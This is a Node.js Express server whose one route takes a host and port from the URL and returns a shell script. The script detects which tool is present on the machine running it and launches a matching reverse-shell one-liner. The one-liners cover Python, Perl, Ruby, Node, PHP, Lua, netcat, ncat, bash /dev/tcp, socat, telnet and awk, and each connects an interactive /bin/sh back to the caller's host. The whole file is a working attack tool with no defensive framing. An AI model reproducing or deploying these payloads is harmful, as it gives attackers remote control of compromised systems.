var express = require("express")
const config = require('config');

const port = config.get('server.port');
const host = config.get('server.host');
var app = express();

const server = app.listen(port, host, (err) => {
    if (err) {
        console.log(err);
        process.exit(1);
    }
    console.log(`Server is running on http://${host}:${server.address().port}`);
});

/*
    welcome to my trash code :) 
*/
app.get("/:sh", (req, res, next) => {

    var [host, port] = req.params.sh.toString().split(':')

    const payloads = {
        python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
        python2: `python2 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
        python3: `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,        
        perl: [`perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, 
                `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${host}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`],                
        ruby: [`ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`, 
                `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${host}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,],
        node: [`node -e '(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(${port}, "${host}", function(){client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);}); return /a/; })();'`,
                `node -e "require('child_process').exec('nc -e sh ${host} ${port}');"`],
        nodejs: [`node -e '(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(${port}, "${host}", function(){client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);}); return /a/; })();'`,
                `node -e "require('child_process').exec('nc -e sh ${host} ${port}');"`],        
        php: `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,        
        lua: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${host}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
        nc: [`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`, `nc -e /bin/sh ${host} ${port}`],
        ncat: [`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat ${host} ${port} >/tmp/f`, `ncat -e /bin/sh ${host} ${port}`],
        sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`,
        bash:`sh -i 5<> /dev/tcp/${host}/${port} 0<&5 1>&5 2>&5`,
        socat:`socat TCP:${host}:${port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
        telnet: `TF=$(mktemp -u);mkfifo $TF && telnet ${host} ${port} 0<$TF | sh 1>$TF`,
        awk:`awk 'BEGIN {s = "/inet/tcp/0/${host}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
    }
    
    var sheet = '';

    Object.entries(payloads).forEach(([key, value]) => {
        if(typeof(value) === 'object'){
            var t = ''
            for(var i in value) t += value[i] + ';' + '\n\t';
            sheet += `\nif command -v ${key} > /dev/null 2>&1; then \n\t${t}\n\texit;\nfi\n`
        }else{
            sheet += `\nif command -v ${key} > /dev/null 2>&1; then \n\t${value}\n\texit;\nfi\n`
        }
    });

    res.setHeader('Content-Type', 'text/plain')
    res.send(sheet)

});
